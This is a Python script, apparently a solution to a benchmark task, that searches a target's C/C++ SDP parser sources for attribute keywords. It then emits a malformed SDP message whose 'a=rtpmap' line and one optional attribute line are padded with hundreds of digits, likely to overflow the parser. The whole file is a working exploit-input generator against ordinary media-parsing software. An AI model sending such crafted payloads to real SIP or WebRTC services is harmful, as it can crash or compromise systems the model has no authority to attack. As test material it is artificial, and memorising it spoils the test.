import os
import tarfile
import tempfile
from typing import Iterable, Tuple, Set


class Solution:
    def _iter_relevant_source_files(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".ipp")
        max_size = 2_000_000

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    lfn = fn.lower()
                    if not lfn.endswith(exts):
                        continue
                    full = os.path.join(root, fn)
                    rel = os.path.relpath(full, src_path)
                    lrel = rel.lower()
                    if ("sdp" not in lrel) and ("parser" not in lrel):
                        continue
                    try:
                        st = os.stat(full)
                        if st.st_size > max_size:
                            continue
                        with open(full, "rb") as f:
                            yield rel, f.read()
                    except Exception:
                        continue
            return

        if not os.path.exists(src_path):
            return

        try:
            if tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        name = m.name
                        lname = name.lower()
                        if not lname.endswith(exts):
                            continue
                        if ("sdp" not in lname) and ("parser" not in lname):
                            continue
                        if m.size > max_size:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                            yield name, data
                        except Exception:
                            continue
        except Exception:
            return

    def _scan_keywords(self, src_path: str, keywords: Iterable[bytes]) -> Set[bytes]:
        found: Set[bytes] = set()
        kws = list(keywords)
        for _, data in self._iter_relevant_source_files(src_path):
            low = data.lower()
            for kw in kws:
                if kw in low:
                    found.add(kw)
            if len(found) == len(kws):
                break
        return found

    def solve(self, src_path: str) -> bytes:
        kw_order = [b"rtpmap", b"extmap", b"ssrc", b"rtcp-fb", b"fmtp", b"fingerprint", b"simulcast", b"rid", b"msid"]
        found = self._scan_keywords(src_path, kw_order)

        chosen = [b"rtpmap"]
        for kw in kw_order[1:]:
            if kw in found:
                chosen.append(kw)
                break

        digits1 = b"9" * 480
        digits2 = b"8" * 240

        lines = [
            b"v=0\r\n",
            b"o=- 0 0 IN IP4 127.0.0.1\r\n",
            b"s=-\r\n",
            b"t=0 0\r\n",
            b"m=audio 9 RTP/AVP 0\r\n",
            b"c=IN IP4 0.0.0.0\r\n",
        ]

        lines.append(b"a=rtpmap:" + digits1 + b"\r\n")

        if len(chosen) > 1:
            kw = chosen[1]
            if kw == b"extmap":
                lines.append(b"a=extmap:" + digits2 + b"\r\n")
            elif kw == b"ssrc":
                lines.append(b"a=ssrc:" + digits2 + b"\r\n")
            elif kw == b"rtcp-fb":
                lines.append(b"a=rtcp-fb:" + digits2 + b"\r\n")
            elif kw == b"fmtp":
                lines.append(b"a=fmtp:" + digits2 + b"\r\n")
            elif kw == b"fingerprint":
                lines.append(b"a=fingerprint:" + digits2 + b"\r\n")
            elif kw == b"simulcast":
                lines.append(b"a=simulcast:" + digits2 + b"\r\n")
            elif kw == b"rid":
                lines.append(b"a=rid:" + digits2 + b"\r\n")
            elif kw == b"msid":
                lines.append(b"a=msid:" + digits2 + b"\r\n")

        return b"".join(lines)